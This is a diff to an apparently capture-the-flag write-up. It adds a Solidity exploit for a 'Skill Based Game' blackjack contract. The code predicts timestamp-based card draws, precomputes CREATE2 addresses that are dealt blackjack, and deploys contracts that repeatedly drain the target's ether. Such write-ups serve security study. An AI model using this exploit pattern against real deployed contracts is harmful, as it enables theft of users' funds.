@@ -6,7 +6,8 @@ We have solved all challenges (didn't manage to get the exploit working for JOP 
 * [Suspicious Charity](#suspicious-charity)  
 * [DAI++](#dai)  
 * [Dragon Tyrant](#dragon-tyrant) 
-* [Black Sheep](#black-sheep) 
+* [Black Sheep](#black-sheep)
+* [Skill Based Game](#skill-based-game)
 * [Blockchain Enterprise](#blockchain-enterprise) 
 * [Hopping Into Place](#hopping-into-place) 
 * [Grains of Sand](#grains-of-sand) 
@@ -565,6 +566,68 @@ contract Exploit {
         require(msg.value > 20);
     }
 }
+```
+
+### Skill Based Game
+
+```solidity
+contract Black {
+    address private immutable BLACKJACK = 0xA65D59708838581520511d98fB8b5d1F76A96cad;
+    function deal1(address player, uint8 cardNumber) public view returns (uint8) {
+        uint256 timestamp = block.timestamp;
+        return uint8(uint256(keccak256(abi.encodePacked(uint256(0), player, cardNumber, timestamp))) % 52);
+    }
+
+    function valueOf(uint8 card, bool isBigAce) internal pure returns (uint8) {
+        uint8 value = card / 4;
+        if (value == 0 || value == 11 || value == 12) {
+            // Face cards
+            return 10;
+        }
+        if (value == 1 && isBigAce) {
+            // Ace is worth 11
+            return 11;
+        }
+        return value;
+    }
+
+    function isAce(uint8 card) internal pure returns (bool) {
+        return card / 4 == 1;
+    }
+
+    function isTen(uint8 card) internal pure returns (bool) {
+        return card / 4 == 10;
+    }
+
+    function test() public payable {
+        bytes32 initcodeHash = keccak256(type(Poc).creationCode);
+        for (uint256 i = 0; i < 200; i++) {
+            uint256 amount = 5 ether;
+            if (BLACKJACK.balance == 0) {
+                break;
+            } else if (BLACKJACK.balance < amount) {
+                amount = BLACKJACK.balance;
+            }
+            address player = address(
+                uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), address(this), bytes32(i), initcodeHash))))
+            );
+            uint8 cardNumber0 = deal1(player, uint8(0));
+            uint8 cardNumber1 = deal1(player, uint8(2));
+            if (valueOf(cardNumber0, isAce(cardNumber0)) + valueOf(cardNumber1, isAce(cardNumber1)) == 21) {
+                console2.log("Found", player, i);
+                player = address(new Poc{salt: bytes32(i), value: amount}());
+            }
+        }
+        console2.log(BLACKJACK.balance);
+    }
+}
+
+contract Poc {
+    constructor() payable {
+        0xA65D59708838581520511d98fB8b5d1F76A96cad.call{value: msg.value}(abi.encodeWithSignature("deal()"));
+    }
+}
+
 ```
 
 ### Blockchain Enterprise
